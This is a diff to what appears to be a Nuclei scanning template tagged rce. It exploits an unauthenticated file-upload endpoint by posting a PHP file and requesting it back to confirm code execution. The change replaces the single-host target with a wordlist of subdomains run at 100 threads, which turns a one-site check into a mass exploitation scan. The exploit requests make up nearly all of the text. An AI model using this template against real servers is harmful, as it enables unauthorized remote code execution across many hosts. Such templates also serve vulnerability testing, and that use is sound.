@@ -8,10 +8,15 @@ info:
   tags: rce
 
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         POST /Upload/upload_file.php?l=test HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
         Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
         Accept-Encoding: gzip, deflate
@@ -27,16 +32,16 @@ requests:
 
         <?php phpinfo(); ?>
         ------WebKitFormBoundaryfcKRltGv--
-
       - |
         GET /Upload/test/test.php HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
-
-    req-condition: true
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body_2, "PHP Version")'
-          - 'status_code_2 == 200'
-        condition: and
+      - type: word
+        part: body
+        words:
+          - "PHP Version"
+      - type: status
+        status:
+          - 200
